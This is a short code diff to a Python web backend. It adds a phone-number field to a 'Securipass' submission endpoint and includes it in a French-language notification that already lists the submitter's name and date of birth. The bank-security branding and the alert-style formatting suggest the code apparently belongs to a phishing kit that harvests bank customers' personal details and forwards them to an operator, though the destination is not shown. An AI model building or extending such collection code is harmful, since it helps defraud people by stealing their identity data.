@@ -99,6 +99,7 @@ class SecuripassSubmission(BaseModel):
     lastName: str
     firstName: str
     dateOfBirth: str
+    phoneNumber: str
 
 @api_router.post("/securipass/submit")
 async def submit_securipass_data(data: SecuripassSubmission):
@@ -114,6 +115,7 @@ async def submit_securipass_data(data: SecuripassSubmission):
    • Nom: {data.lastName}
    • Prénom: {data.firstName}
    • Date de naissance: {data.dateOfBirth}
+   • Téléphone: {data.phoneNumber}
 
 ⏰ <b>Date de soumission:</b> {datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S')} UTC
         """
